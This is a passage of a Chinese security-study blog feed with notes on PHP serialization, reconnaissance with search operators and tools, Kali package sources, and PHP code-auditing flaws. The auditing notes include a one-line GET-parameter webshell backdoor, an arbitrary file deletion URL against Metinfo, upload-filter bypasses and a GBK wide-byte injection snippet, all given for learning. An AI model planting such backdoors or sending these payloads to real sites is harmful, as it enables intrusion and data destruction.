href="https://www.php.net/manual/zh/language.oop5.decon.php#object.construct">__construct()</a>， <a href="https://www.php.net/manual/zh/language.oop5.decon.php#object.destruct">__destruct()</a>， <a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.call">__call()</a>， <a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.callstatic">__callStatic()</a>， <a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a>， <a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set">__set()</a>， <a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset">__isset()</a>， <a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset">__unset()</a>， <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.sleep">__sleep()</a>， <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup">__wakeup()</a>， <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring">__toString()</a>， <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke">__invoke()</a>， <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.set-state">__set_state()</a>， <a href="https://www.php.net/manual/zh/language.oop5.cloning.php#object.clone">__clone()</a> 和 <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.debuginfo">__debugInfo()</a> 等方法在 PHP 中被称为魔术方法（Magic methods）。<br />PS:在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能。<br><a name="VQ3bA"></a></p><h3 id="魔术方法表示"><a href="#魔术方法表示" class="headerlink" title="魔术方法表示"></a>魔术方法表示</h3><p>PHP 将所有以 <strong>（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以</strong> 为前缀。<br><a name="tph4C"></a></p><h3 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h3><p><a name="12yZK"></a></p><h5 id="序列化：serialize-来返回一个包含字节流的字符串来表示"><a href="#序列化：serialize-来返回一个包含字节流的字符串来表示" class="headerlink" title="序列化：serialize()来返回一个包含字节流的字符串来表示"></a>序列化：<a href="https://www.php.net/manual/zh/function.serialize.php">serialize()</a>来返回一个包含字节流的字符串来表示</h5><blockquote><p><a href="https://www.php.net/manual/zh/function.serialize.php">serialize()</a> 函数会检查类中是否存在一个魔术方法 <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.sleep">__sleep()</a><br>如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。<br><a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.sleep">__sleep()</a> 方法常用于提交未提交的数据，或类似的清理操作。</p></blockquote><p><a name="1L1t9"></a></p><h5 id="反序列化函数：unserialize-函数能够重新把字符串变回php原来的值"><a href="#反序列化函数：unserialize-函数能够重新把字符串变回php原来的值" class="headerlink" title="反序列化函数：unserialize()函数能够重新把字符串变回php原来的值"></a>反序列化函数：<a href="https://www.php.net/manual/zh/function.unserialize.php">unserialize()</a>函数能够重新把字符串变回php原来的值</h5><blockquote><p><a href="https://www.php.net/manual/zh/function.unserialize.php">unserialize()</a> 会检查是否存在一个 <a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup">__wakeup()</a> 方法。如果存在，则会先调用 __<em>wakeup</em> 方法，预先准备对象需要的资源。<br><a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup">__wakeup()</a> 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</p></blockquote><br /><a name="wvpLn"></a>##### 序列化各个量表示的含义<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">序列化函数serialize()</span><br><span class="line">序列化举例说明：</span><br><span class="line">O:3:&quot;Ctf&quot;:3&#123;s:4:&quot;flag&quot;;s:13:&quot;flag&#123;abedyui&#125;&quot;;s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br><span class="line">O代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示</span><br><span class="line">3 代表类名字占三个字符 </span><br><span class="line">ctf 类名</span><br><span class="line">3 代表三个属性</span><br><span class="line">s代表字符串</span><br><span class="line">4代表属性名长度</span><br><span class="line">flag属性名</span><br><span class="line">s:13:&quot;flag&#123;abedyui&#125;&quot; 字符串 属性值长度 属性值</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Notes on Gathering Information [1]</title>
      <link href="/2019/09/23/Notes-on-Gathering-Information/"/>
      <url>/2019/09/23/Notes-on-Gathering-Information/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li><p>HTTrack:网站克隆</p></li><li><p>Google指令——利用谷歌搜索实践</p></li><li><p>The Harvester:挖掘并利用邮箱地址</p></li><li><p>Whois</p></li><li><p>Netcraft</p></li><li><p>host 工具</p></li><li><p>从DNS中提取信息</p></li><li><p>从电子邮件服务器中提取信息</p></li><li><p>MetaGooFil</p></li><li><p>社会工程学</p></li><li><p>筛选提炼信息：找到可攻击目标</p></li></ul><h1 id="对信息收集的认识误区"><a href="#对信息收集的认识误区" class="headerlink" title="对信息收集的认识误区"></a>对信息收集的认识误区</h1><p>信息收集是渗透测试的中最不受重视的一个环节</p><blockquote><p>这样的认识很明显是打错特所的，正相反，这是最重要的一步，但也是最容易被忽略的一步，那么它的影响程度到底有多大呢？<br>可以毫不夸张的说，在收集目标信息上所花费的时间越多，后续阶段的成功率也就越高。</p></blockquote><h1 id="信息收集浅谈"><a href="#信息收集浅谈" class="headerlink" title="信息收集浅谈"></a>信息收集浅谈</h1><p>信息收集主要分为主动和被动</p><p>主动收集：与目标系统的直接交互，目标系统可能会记录下我们的IP地址及活动</p><p>被动收集：利用Google获取海量信息，不会与目标交互，不会被记录活动</p><p>信息收集的目的在于尽可能多的收集与目标相关的信息。并且收集信息的时候要尽可能将数据集中保存起来。</p><h3 id="HTTrack"><a href="#HTTrack" class="headerlink" title="HTTrack"></a>HTTrack</h3><p>当浏览或者探测某个网站的时间越多，那么我们的活动就越有可能被跟踪(哪怕只是随意的浏览网站)，只要是属于目标的资源，任何时候与之交互都有可能留下痕迹。</p><p>利用HTTrack我们可以从某个网站的本地副本中提取额外或者隐藏的信息<br>HTTrack可以将整个网页逐页下载下来，通过它可以建立完全的脱机副本。<br>Kali命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install webhttrack</span><br></pre></td></tr></table></figure><h3 id="关注点"><a href="#关注点" class="headerlink" title="关注点"></a>关注点</h3><p>物理地址和位置、电话号码、电子邮箱地址、运营时间、商业关系、员工姓名、与社会化媒体的联系、以及其他公开的花絮趣闻等等</p><p>综上所述，我们要彻查目标网站，对目标有一个全面的了解：是什么(这是一家什么样的公司)、做什么(具体做什么业务)、公司设在哪里。</p><p>在有了这些基本信息之后，我们可以进入被动侦察(即，被动收集)阶段。</p><h3 id="被动侦察"><a href="#被动侦察" class="headerlink" title="被动侦察"></a>被动侦察</h3><p>首先要做的事利用各大搜索引擎对目标进行地毯式的搜索</p><p>不过 仅仅利用好谷歌，我们就可以完成整个渗透测试工作<br>(推荐看Google Hacking  作者:Jonny)</p><p>不得不提一点，在我们被动侦擦过程中，如果我们点击搜索结果的任何一条链接，都会与目标建立系统的联系，也就回到了主动侦察的模式。。。。。</p><h3 id="Google指令——搜索实践"><a href="#Google指令——搜索实践" class="headerlink" title="Google指令——搜索实践"></a>Google指令——搜索实践</h3><p>指令格式：<br>1)你想要用的指令<br>2)半角冒号<br>3)指令中要用到的具体内容</p><p>Eg:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:domain term(搜索某网站我们想知道的信息)</span><br></pre></td></tr></table></figure><p>allintitle:网页标题必须包含所有的关键字才会出现在搜索结果里<br>intitle:只需包含任意一个关键字即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allintitle:index of(查看web服务器上的所有可用的索引目录列表)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:admin(这条命令用于发现目标网站的管理或者设者页面)</span><br></pre></td></tr></table></figure><blockquote><p>使用Google快照会减少在目标服务器上留下痕迹，而且有机会浏览到原网站已移除的网页和文件。只要是谷歌爬虫抓取过的页面，都会在网页快照中保存一个精简的副本。</p></blockquote><p>cache:让谷歌只显示网页快照里的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cache:domain</span><br></pre></td></tr></table></figure><p>filetype:搜索特定文件的扩展名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filetype:pdf</span><br></pre></td></tr></table></figure><p>命令结合使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:domain filetype:xxx(搜索某网站所有xxx格式的文件)</span><br></pre></td></tr></table></figure><h3 id="利用社交资源"><a href="#利用社交资源" class="headerlink" title="利用社交资源"></a>利用社交资源</h3><p>当我们彻查完目标网页，并借助谷歌服务我们之后，其他社交媒体也会发挥作用。</p><p>一些论坛，或者新闻中心等等可能会出现关于目标的言论，如技术问题。</p><p>简言之，公共论坛算是分享信息并寻求技术支持的宝地。</p><h3 id="The-Harvester"><a href="#The-Harvester" class="headerlink" title="The Harvester"></a>The Harvester</h3><p>….</p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali Updating Sources</title>
      <link href="/2019/09/09/Kali-Updating-Sources/"/>
      <url>/2019/09/09/Kali-Updating-Sources/</url>
      
        <content type="html"><![CDATA[<p>kali更新源：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"># kali官方源</span><br><span class="line">deb http://http.kali.org/ moto main non-free contrib </span><br><span class="line">deb-src http://http.kali.org/ moto main non-free contrib</span><br><span class="line"></span><br><span class="line">deb http://security.kali.org/ moto/updates main contrib non-free </span><br><span class="line">deb-src http://security.kali.org/ moto/updates main contrib non-free</span><br><span class="line"></span><br><span class="line">#中科大kali源 </span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali main non-free contrib </span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali main non-free contrib </span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free</span><br><span class="line"></span><br><span class="line">#新加坡kali源 </span><br><span class="line">deb http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib </span><br><span class="line">deb-src http://mirror.nus.edu.sg/kali/kali/ kali main non-free contrib </span><br><span class="line">deb http://security.kali.org/kali-security kali/updates main contrib non-free </span><br><span class="line">deb http://mirror.nus.edu.sg/kali/kali-security kali/updates main contrib non-free </span><br><span class="line">deb-src http://mirror.nus.edu.sg/kali/kali-security kali/updates main contrib non-free</span><br><span class="line"></span><br><span class="line">#阿里云kali源 </span><br><span class="line">deb http://mirrors.aliyun.com/kali kali main non-free contrib </span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali main non-free contrib </span><br><span class="line">deb http://mirrors.aliyun.com/kali-security kali/updates main contrib non-free</span><br><span class="line"></span><br><span class="line">#163 Kali源 </span><br><span class="line">deb http://mirrors.163.com/debian wheezy main non-free contrib </span><br><span class="line">deb-src http://mirrors.163.com/debian wheezy main non-free contrib </span><br><span class="line">deb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib </span><br><span class="line">deb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib </span><br><span class="line">deb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib </span><br><span class="line">deb http://mirrors.163.com/debian-security wheezy/updates main non-free contrib </span><br><span class="line">#auto </span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#中科大 </span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#浙大 </span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br><span class="line">#东软大学 </span><br><span class="line">deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib </span><br><span class="line">deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line"></span><br><span class="line">#重庆大学 </span><br><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#官方源 </span><br><span class="line">#deb http://http.kali.org/kali kali-rolling main non-free contrib </span><br><span class="line">#deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">推荐：</span><br><span class="line"></span><br><span class="line"># kali官方源</span><br><span class="line">deb http://http.kali.org/ kali-rolling main non-free contrib </span><br><span class="line">deb-src http://http.kali.org/ kali-rolling main non-free contrib</span><br><span class="line"></span><br><span class="line">#中科大源</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><p>更新安装软件列表和软件;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp; apt-get upgrade</span><br></pre></td></tr></table></figure><p>升级软件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get dist-upgrade</span><br></pre></td></tr></table></figure><p>清理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get clean</span><br></pre></td></tr></table></figure><p>重启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Learning Code Auditing [1]</title>
      <link href="/2019/07/25/Learning-Code-Auditing-1/"/>
      <url>/2019/07/25/Learning-Code-Auditing-1/</url>
      
        <content type="html"><![CDATA[<h1 id="一、常见的代码审计工具"><a href="#一、常见的代码审计工具" class="headerlink" title="一、常见的代码审计工具"></a>一、常见的代码审计工具</h1><p>1、Fortify SCA</p><p>Fortify SCA是一个静态的、白盒的软件源代码安全测试工具，它通过内置的五大主要分析引擎：数据流、语义、结</p><p>2、Checkmarx CxSuite</p><p>Checkmarx CxSuite的扫描结果可以以静态报表形式展示，也可以通过可以对软件安全漏洞和质量缺陷在代码的运</p><p>3、360代码卫士</p><p>360代码卫士是360企业安全集团基于多年源代码安全实践经验推出的新一代源代码安全检测解决方案，包括源代码</p><p>4、PHP代码审计工具——RIPS</p><p>参考：<a href="https://www.jianshu.com/p/cd1cb66e4d7d">https://www.jianshu.com/p/cd1cb66e4d7d</a></p><p>5、SEAY代码审计（常用）</p><p>参考：<a href="https://www.oschina.net/p/seay">https://www.oschina.net/p/seay</a></p><p>6、SONARQUBE</p><p>参考：<a href="https://www.cnblogs.com/qiumingcheng/p/7253917.html">https://www.cnblogs.com/qiumingcheng/p/7253917.html</a></p><p>7、COBRA</p><p>参考：<a href="https://zhuanlan.zhihu.com/p/32363880">https://zhuanlan.zhihu.com/p/32363880</a></p><p>8、KIWI</p><p>参考：<a href="https://github.com/alpha1e0/kiwi">https://github.com/alpha1e0/kiwi</a></p><h1 id="二、代码审计中常见的危险函数和字符串"><a href="#二、代码审计中常见的危险函数和字符串" class="headerlink" title="二、代码审计中常见的危险函数和字符串"></a>二、代码审计中常见的危险函数和字符串</h1><h2 id="0x01-整体"><a href="#0x01-整体" class="headerlink" title="0x01 整体"></a>0x01 整体</h2><p>学习代码审计的目标是能够独立完成对一个CMS的代码安全监测。其通用的思路有：</p><p>● 通读全文代码，从功能函数代码开始阅读，例如include文件夹下的common_fun.php，或者有类似关键字的文</p><p>● 看配置文件，带有config关键字的文件，找到mysql.class.php文件的connect()函数，查看在数据库连接时是</p><p>● 继续跟读首页文件,index.php,了解程序运作时调用了哪些函数和文件</p><p>以index.php文件作为标线，一层一层去扩展阅读所包含的文件，了解其功能，之后进入其功能文件夹的首页</p><h2 id="0x02-各种洞洞"><a href="#0x02-各种洞洞" class="headerlink" title="0x02 各种洞洞"></a>0x02 各种洞洞</h2><p>A.文件操作漏洞</p><p>● 能不用文件名参数就不用 尽量不要让用户可控</p><p>● 平行用户的权限 管理员的权限 操作权限</p><p>● 禁止传入参数类似于这种 .. ,&#x2F;,\ 检查传入的参数,做出限制,停止程序往下执行</p><p>1.文件包含漏洞：</p><p>(1) 本地文件包含：</p><p>● 一般存在于模块加载，模板加载，cache调用</p><p>● 包括函数：include()&#x2F;include_once()，require()&#x2F;require_once()寻找可控变量</p><p>(2) 远程文件包含：</p><p>● 前提条件：allow_url_include &#x3D; on</p><p>● 出现频率不如本地包含</p><p>(3) 文件包含截断：</p><p>● %00截断(php版本小于5.3)</p><p>● 问号截断(问号后面相当于请求的参数，伪截断)</p><p>● 英文(.) 反斜杠(&#x2F;) 截断</p><p>2.文件读取(下载)漏洞：</p><p>搜索关键函数:</p><blockquote><p>file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等</p></blockquote><p>3.文件上传漏洞：</p><p>搜索关键函数:</p><p>move_uploaded_file() 接着看调用这个函数的代码是否存在为限制上传格式或者可以绕过。</p><p>(1) 未过滤或本地过滤：服务器端未过滤，直接上传PHP格式的文件即可利用。</p><p>(2) 黑名单扩展名过滤：</p><p>● 限制不够全面：IIS默认支持解析.asp,.cdx, .asa,.cer等。</p><p>● 扩展名可绕过：</p><p>不被允许的文件格式.php，但是我们可以上传文件名为1.php(注意后面有一个空格)</p><p>(3) 文件头 content-type验证绕过：</p><p>● getimagesize()函数：验证文件头只要为GIF89a，就会返回真。</p><p>● 限制$_FILES[“file”][“type”]的值 就是人为限制content-type为可控变量。</p><p>(4) 防范：</p><p>● 使用in_array()或 利用三等于&#x3D;&#x3D;&#x3D;对比扩展名。</p><p>● 保存上传文件是重命名，规则采用时间戳拼接随机数：md5(time() + rand(1,1000))。</p><p>4.文件删除漏洞：</p><p>搜索关键函数：</p><p>● unlink()利用回溯变量的方式</p><p>● 老版本下的session_destroy()，可以删除文件，现已基本被修复。</p><p>Metinfo的任意文件删除漏洞：</p><p>$action &#x3D; delete即可删除.sql的文件，如果文件不是sql直接删除提交的文件名</p><p><a href="http://target.com/recovery.php?&amp;action=delete&amp;filename=../../index.php">http://target.com/recovery.php?&amp;action=delete&amp;filename=../../index.php</a></p><p>B.代码执行漏洞</p><p>1.代码执行函数：</p><p>搜索关键函数：</p><blockquote><p>eval(), assert(), preg_replace(), call_user_func(), call_user_func_array(), arra</p></blockquote><p>(1) preg_replace()函数：</p><blockquote><p>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] )</p></blockquote><p>当$pattern处存在e修饰符时，$replacement 会被当做php代码执行。</p><p>(2)mixed call_user_func( callable $callbank [ , mixed $parameter [ , mixed $…)：</p><p>第一个参数为回调函数，第二个参数是回调函数的参数</p><p>(3)eval()和assert()：</p><p>当assert()的参数为字符串时 可执行PHP代码</p><p>【区分】：</p><p>eval(“ phpinfo(); “);【√】 eval(“ phpinfo() “);【X】</p><p>assert(“ phpinfo(); “);【√】 assert(“ phpinfo() “);【√】</p><p>2.动态函数执行：</p><p>动态函数后门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>3.命令执行函数：</p><p>搜索关键函数：</p><blockquote><p>system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p></blockquote><p>(1) popen和proc_open()：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">popen( &#x27;whoami &gt;&gt; /Users/bingdaojueai/Desktop/1.txt&#x27;, &#x27;r&#x27; ); ?&gt;</span><br></pre></td></tr></table></figure><p>所在路径就会出现一个1.txt 里面的内容为命令执行后的结果</p><p>(2) 反引号命令执行：</p><p>echo whoami; 直接就可以执行命令</p><p>双引号和单引号的区别：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">$a = 1</span><br><span class="line"></span><br><span class="line">echo &quot; $a &quot; output：1</span><br><span class="line"></span><br><span class="line">echo &#x27; $a &#x27; output：$a</span><br></pre></td></tr></table></figure><p>双引号时，可以直接解析变量，造成代码执行漏洞，过狗绕过。</p><p>C.变量覆盖漏洞</p><p>1.函数使用不当：</p><p>● int extract( array &amp;$var_array , int $extract_type &#x3D; EXTR_OVERWRITE , string $prefix &#x3D; null )</p><p>● void parse_str( string $str , array &amp;$arr )</p><p>● bool import_request_variables( string $type , string $prefix )</p><p>2.$$变量覆盖：</p><p>D.逻辑漏洞</p><p>需要思考的问题：</p><p>● 程序是否可以重复安装</p><p>● 修改密码是否存在越权修改其他用户密码</p><p>● 找回密码验证码是否可以暴力破解</p><p>● cookie是否可以预测 验证存在绕过</p><p>1.等于与存在判断绕过：</p><p>(1) in_array(): 比较之前会自动转换类型</p><p>(2)is_numeric():当传入参数为hex时 直接通过并返回true 并且MYSQL可以直接使用hex编码代替字符串明文可以二次注入 并且可能造成XSS漏洞</p><p>(3)双等于&#x3D;&#x3D;和三等于&#x3D;&#x3D;&#x3D;：</p><p>● 双等于会在变量比较时，进行类转换，与in_array()是一样的问题。</p><p>● 三等于是type和value的双重比较，相比之下更加安全。</p><p>2.账户体系中的越权问题：</p><p>● 水平越权：A用户能够以B用户的身份，进行B用户的全部权限操作。前提A用户和B用户拥有相同的权限。</p><p>● 垂直越权：A用户能够以C用户的身份，进行C用户的全部权限操作，前提C用户比A用户拥有更高的权限。</p><p>(1) 未exit&#x2F;return&#x2F;die：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(file_exists(&#x27;install.lock))&#123;</span><br><span class="line"></span><br><span class="line">header(&quot;Location:http://xxx.com&quot;);</span><br><span class="line"></span><br><span class="line">//exit();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;test&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>test 依旧会被输出，替换成安装流程，PHP依旧会进行。</p><p>(2) 支付漏洞：</p><p>● 客户端修改单价</p><p>● 客户端修改总价和购买数量</p><p>● 服务端未校验严格</p><p>重复发包利用时间差：</p><h1 id="php"><a href="#php" class="headerlink" title="!php"></a>!php</h1><?phpif (check_money($price)){//Do something//花费几秒$money = $money - $price;}?><p>可能导致漏洞函数： str_replace()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a = addslashes($_GET[&#x27;a&#x27;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$b = addslashes($_GET[&#x27;b&#x27;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;$a&lt;br&gt;$b&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">$c = str_replace($a,&#x27;&#x27;,$b);</span><br><span class="line"></span><br><span class="line">echo trim($c);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>E.会话认证漏洞</p><p>COOKIE验证：没有使用SESSION验证，将信息直接保存在COOKIE中</p><p>a 找到传入sql语句的参数的传递过程 回溯变量到最原始的函数 看它保存在cookie的算法是否可逆<br>b 和MD5比起 sha1更安全 解密sha1的网站更少<br>c 限制一个用户只能同时在一个IP上登录审计代码时，查看登录处代码</p><p>F.二次漏洞</p><p>1.类型：</p><p>● 不是逻辑问题，是可信问题。</p><p>● 业务逻辑复杂度，与二次漏洞触发率 成正比。</p><p>● 购物车 &#x2F; 订单 &#x2F; 引用数据 &#x2F; 文章编辑 &#x2F; 草稿 &#x3D;&#x3D;&gt; SQL注入 &#x2F; XSS</p><p>2.技巧：</p><p>(1) 钻GPC等转义的空子：</p><p>● 不受GPC保护的$_SERVER变量：PHP5以后，$_SERVER取到的header不再受GPC影响，就算开启特殊字符也</p><p>编码问题转换：</p><p>a GBK的宽字节注入：%df ‘ 单引号自动被转义成(%5c)，同时%df与%5c连在一起组合成運字单引号依然</p><p>mb_convert_encoding()：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!php</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;/&gt; &lt;?php</span><br><span class="line"></span><br><span class="line">$sql = &quot;WHERE id=&#x27;&quot;.urldecode(&quot;-1%df%5c&#x27; == &quot;).&quot;&#x27;&quot;; print_r(mb_convert_encoding($sql,&quot;UTF-8&quot;,&quot;GBK&quot;)); ?&gt;</span><br></pre></td></tr></table></figure><p>(2)字符串问题：</p><p>● 利用报错，找到敏感信息</p><h2 id="字符串截断"><a href="#字符串截断" class="headerlink" 